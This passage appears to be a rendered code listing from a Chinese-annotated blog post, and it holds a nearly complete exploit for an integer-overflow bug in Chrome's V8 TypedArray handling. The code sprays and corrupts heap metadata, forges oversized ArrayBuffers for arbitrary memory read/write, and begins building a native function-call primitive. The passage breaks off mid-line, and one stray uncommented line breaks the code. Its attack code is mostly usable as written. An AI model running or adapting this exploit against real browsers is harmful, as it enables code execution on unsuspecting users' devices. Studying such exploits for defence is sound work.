class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"?"</span>&gt;---------<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'?'</span> + <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">window</span>.location + <span class="string">''</span>).indexOf(time) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.location = time;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="string">'Ready.\nThis is a Slow Exploit.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nooo = [];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        nooo.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert = print;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制将ArrayBuffer转换为native wrapper，用于后面修改其长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This WebGL stuff is just to force an ArrayBuffer or ArrayBufferView to</span></span><br><span class="line"><span class="comment">// create a native wrapper, hopefully without allocating anything else (to</span></span><br><span class="line"><span class="comment">// simplify assumptions).</span></span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">gl = canvas.getContext(<span class="string">"webgl"</span>) || canvas.getContext(<span class="string">"experimental-webgl"</span>);</span><br><span class="line"><span class="keyword">if</span>(!gl) &#123;</span><br><span class="line">    alert(<span class="string">'no webgl'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ext = gl.getExtension(<span class="string">'WEBGL_lose_context'</span>);</span><br><span class="line"><span class="keyword">if</span>(!ext) &#123;</span><br><span class="line">    alert(<span class="string">'no lose_context'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">ext.loseContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">force</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    gl.bufferData(<span class="number">0</span>, buffer, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> thingiesToFree = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForce = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForceEarly = [];</span><br><span class="line"><span class="keyword">var</span> viewsToForceEarly = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    buffersToForce.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">4097</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x52</span>);</span><br><span class="line">        force(buf);</span><br><span class="line">        buffersToForceEarly.push(buf);</span><br><span class="line">        <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf, <span class="number">0</span>, <span class="number">0x51</span>);</span><br><span class="line">        force(view);</span><br><span class="line">        viewsToForceEarly.push(view);</span><br><span class="line">    &#125;</span><br><span class="line">    thingiesToFree.push([]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hexChars = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asHex</span>(<span class="params">num, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(len === <span class="literal">undefined</span>)</span><br><span class="line">        len = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.log(num)/<span class="built_in">Math</span>.log(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        s += hexChars[(num &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xf</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexDump</span>(<span class="params">off, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = off; i &lt; off + len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != off) s += <span class="string">'\n'</span>;</span><br><span class="line">            s += <span class="string">'+'</span> + asHex(i, <span class="number">8</span>) + <span class="string">':'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += <span class="string">' '</span> + asHex(read8(i), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pre</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'pre'</span>);</span><br><span class="line">    el.innerHTML = s;</span><br><span class="line">    <span class="built_in">document</span>.documentElement.appendChild(el);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sniffAroundInHeap</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'+1'</span>);</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">//ary[0x7eadbeef];</span></span><br><span class="line">    <span class="keyword">var</span> haveVtable = <span class="literal">false</span>, haveBuffers = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ary.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!haveVtable &amp;&amp; ary[i] == <span class="number">0x51</span>) &#123;</span><br><span class="line">            <span class="comment">// this is DataView+0x20, from which we get the vtable</span></span><br><span class="line">            vtable = ary[i - <span class="number">0x20</span>/<span class="number">4</span>];</span><br><span class="line">            <span class="comment">//alert('vtable = ' + vtable);</span></span><br><span class="line">            haveVtable = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveBuffers &lt; <span class="number">2</span> &amp;&amp; ary[i] == <span class="number">0x52</span>) &#123;</span><br><span class="line">            <span class="comment">// this is ArrayBuffer+8, from which we create predictable windows</span></span><br><span class="line">            <span class="comment">// onto memory Why does changing this number affect behavior (v8</span></span><br><span class="line">            <span class="comment">// crashes in ShortCircuitConsString in the garbage collector)?</span></span><br><span class="line">            <span class="keyword">if</span>(haveBuffers == <span class="number">0</span>) &#123;</span><br><span class="line">                callbuf = ary[i<span class="number">-1</span>];</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x100</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7fffffff</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x80000000</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7ffffffe</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            haveBuffers++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveVtable &amp;&amp; haveBuffers == <span class="number">2</span>) &#123;</span><br><span class="line">            launderBuffers(buffersToForceEarly, <span class="string">'savedBuffersToForceEarly'</span>, prepareForCalls);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"didn't find the things"</span>);</span><br><span class="line">    crash();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//hexDump(ary, 0, 0x10000);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新wrapper的长度为memory corrupted的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launderBuffers</span>(<span class="params">origBuffers, prop, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Need to get new V8 wrappers that reflect the native object's new</span></span><br><span class="line">    <span class="comment">// m_sizeInBytes</span></span><br><span class="line">    <span class="comment">// alert('launderBuffers - ' + buffersToForce.length);</span></span><br><span class="line">    <span class="comment">// N.B. this doesn't work with MessageChannels for some reason - the</span></span><br><span class="line">    <span class="comment">// ArrayBuffers become null.  My fault or a bug?</span></span><br><span class="line">    <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//alert('onmessage');</span></span><br><span class="line">            <span class="keyword">var</span> buffers = e.data;</span><br><span class="line">            <span class="built_in">window</span>[prop] = buffers;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffers.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> buffer = buffers[i];</span><br><span class="line">                <span class="keyword">if</span>(buffer.byteLength &gt;= <span class="number">0x7ffffffe</span>) &#123;</span><br><span class="line">                    <span class="comment">//alert('buffer ' + i + '.length = ' + buffer.byteLength);</span></span><br><span class="line">                    <span class="keyword">if</span>(callback(buffer))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            alert(<span class="string">'no good buffers found - '</span> + prop);</span><br><span class="line">            crash();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            alert(<span class="string">'lB exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">            crash();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.postMessage(origBuffers, <span class="string">'*'</span>, origBuffers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceWithWTFArrayBuffer</span>(<span class="params">arrays, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextOff = <span class="number">0x20</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="comment">// next should have CINUSE and PINUSE set</span></span><br><span class="line">    arrays[j][nextOff + <span class="number">4</span>] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="comment">// now free it</span></span><br><span class="line">    arrays[j] = <span class="literal">null</span>;</span><br><span class="line">    thingiesToFree = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> thingiesToMake = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffersToForce.length; i++) &#123;</span><br><span class="line">        force(buffersToForce[i]);</span><br><span class="line">        <span class="comment">// try unnecessarily hard to cause a GC</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">1000</span>; k++) &#123;</span><br><span class="line">            thingiesToMake.push([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// time to keep overwriting starting at the WTF::ArrayBuffer + 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;<span class="comment">//分配给a byteSize字节，并用B填充它。</span></span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Here's the actual v8 vulnerability in this complicated thing.</span></span><br><span class="line">    <span class="comment">// Runtime_TypedArrayInitializeFromArrayLike checks for the lack of</span></span><br><span class="line">    <span class="comment">// multiplicative overflow with 'length * element_size &lt; length'.</span></span><br><span class="line">    <span class="comment">// 0x24924925 is 2^32/7 + 1, the smallest number for which this check</span></span><br><span class="line">    <span class="comment">// passes, yet there was in fact overflow.</span></span><br><span class="line">    <span class="keyword">var</span> bad = (<span class="number">0x24925000</span> - <span class="number">8</span>) / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> hugetempl = &#123;</span><br><span class="line">      <span class="comment">//length: 0x4924924,</span></span><br><span class="line">      length: <span class="number">0x24924925</span>,</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      i: 76696062,</span></span><br><span class="line"><span class="comment">      get 76696062() &#123;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      i: <span class="number">0</span>,</span><br><span class="line">      get <span class="number">0</span>() &#123;</span><br><span class="line">        <span class="comment">//alert('creating pages');</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            createArray(<span class="number">0x20000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert('done');</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    hugetempl.__defineGetter__(bad, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prev: whatever</span></span><br><span class="line">        <span class="comment">// head: 0x20 | PINUSE_BIT(1) | CINUSE_BIT(2)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">7.611564664e-313</span>;<span class="comment">//deadbeef 00000023,覆盖chunk的meta data，将其size由0x20000改为0x20。</span></span><br><span class="line">        <span class="comment">//在free之后，就会插入0x20 byte free-list的头部</span></span><br><span class="line">    &#125;);<span class="comment">//一页的最后</span></span><br><span class="line">    <span class="keyword">var</span> foundIt = <span class="literal">false</span>;</span><br><span class="line">    hugetempl[bad + <span class="number">1</span>] = <span class="number">2261634.5098039214</span>; <span class="comment">// overwrites </span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在相邻的下一页开始的地方</span></span><br><span class="line"><span class="comment">    u2d</span></span><br><span class="line"><span class="comment">    sakura@sakuradeMacBook-Pro:~$ ./u2d 2261634.5098039214</span></span><br><span class="line"><span class="comment">    ########## mode2 ###########</span></span><br><span class="line"><span class="comment">    表示变换:(ull/ui -&gt; double/float)</span></span><br><span class="line"><span class="comment">    2261634.5098039214(2.261634509803921e+06 ) --d2ull-&gt; 0x4141414141414141</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    the beginning <span class="keyword">of</span> the array</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arraysI; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[j][<span class="number">0</span>] != <span class="number">0x42</span>) &#123;</span><br><span class="line">                <span class="comment">//alert('&lt;- ' + j + ': ' + arrays[j][0]);</span></span><br><span class="line">                replaceWithWTFArrayBuffer(arrays, j);</span><br><span class="line">                foundIt = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// m_sizeInBytes=2^31-1 m_deallocationObserver=null</span></span><br><span class="line">                <span class="comment">// can't go higher because it gets treated as signed</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.060997895e-314</span>;</span><br><span class="line">                <span class="comment">//0.0000000000(1.060997894988571e-314) --d2ull-&gt; 0x000000007fffffff</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        alert(<span class="string">'No good.  Crashing Chrome for another try...'</span>);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;);</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">3</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> huge = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(hugetempl);<span class="comment">//-&gt;触发</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(e == <span class="string">'ok'</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lowView = <span class="literal">null</span>, highView = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'return highView.'</span> + prop + <span class="string">'(a - 0x80000000, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'return lowView.'</span> + prop + <span class="string">'(a - 0x100, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'v'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'highView.'</span> + prop + <span class="string">'(a - 0x80000000, v, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'lowView.'</span> + prop + <span class="string">'(a - 0x100, v, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> read32 = rfunc(<span class="string">'getUint32'</span>);</span><br><span class="line"><span class="keyword">var</span> read8 = rfunc(<span class="string">'getUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write8 = wfunc(<span class="string">'setUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write32 = wfunc(<span class="string">'setUint32'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">start, step, words</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> first = words[<span class="number">0</span>], second = words[<span class="number">1</span>];</span><br><span class="line">    outer:</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = start; ; a += step) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read32(a) == first &amp;&amp; read32(a+<span class="number">4</span>) == second) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">2</span>; j &lt; words.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(a + j*<span class="number">4</span>) != words[j])</span><br><span class="line">                    <span class="keyword">continue</span> outer;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blxDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = read32(addr);</span><br><span class="line">    <span class="keyword">var</span> s = (val &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> i1 = <span class="number">1</span> - (((val &amp; <span class="number">0x20000000</span>) &gt;&gt; <span class="number">29</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i2 = <span class="number">1</span> - (((val &amp; <span class="number">0x8000000</span>) &gt;&gt; <span class="number">27</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i10h = val &amp; <span class="number">0x3ff</span>;</span><br><span class="line">    <span class="keyword">var</span> i10l = (val &amp; <span class="number">0x7fe0000</span>) &gt;&gt; <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">var</span> off = ((s * <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (i1 &lt;&lt; <span class="number">23</span>) | (i2 &lt;&lt; <span class="number">22</span>) | (i10h &lt;&lt; <span class="number">12</span>) | (i10l &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + <span class="number">4</span> * read8(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrAddPCDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr + <span class="number">2</span> + <span class="number">4</span> + read32(ldrDest(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copystr</span>(<span class="params">p, s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)</span><br><span class="line">        write8(p + i, s.charCodeAt(i));</span><br><span class="line">    write8(p + i, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEGONE = <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">func, a1, a2, a3, a4, a5, a6, a7, a8</span>) </span>&#123;</span><br><span class="line">    assert(func);</span><br><span class="line">    write32(callbuf + <span class="number">0x00</span>, a5);</span><br><span class="line">    write32(callbuf + <span class="number">0x04</span>, a6);</span><br><span class="line">    write32(callbuf + <span class="number">0x08</span>, a7);</span><br><span class="line">    write32(callbuf + <span class="number">0x0c</span>, a8);</span><br><span class="line">    write32(callbuf + <span class="number">0x10</span>, a1);</span><br><span class="line">    write32(callbuf + <span class="number">0x14</span>, a2);</span><br><span class="line">    write32(callbuf + <span class="number">0x18</span>, a3);</span><br><span class="line">    write32(callbuf + <span class="number">0x1c</span>, a4);</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, func);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span> read32(callbuf + <span class="number">0x24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareForCalls</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer, <span class="number">0</span>, buffer.byteLength);</span><br><span class="line">    <span class="keyword">if</span>(buffer.byteLength == <span class="number">0x7fffffff</span>) &#123;</span><br><span class="line">        lowView = dv;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highView = dv;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(lowView &amp;&amp; highView)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    alert(<span class="string">'+2'</span>);</span><br><span class="line">    <span class="keyword">var</span> text = read32(vtable + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> dlsymmer = find((text &amp; ~<span 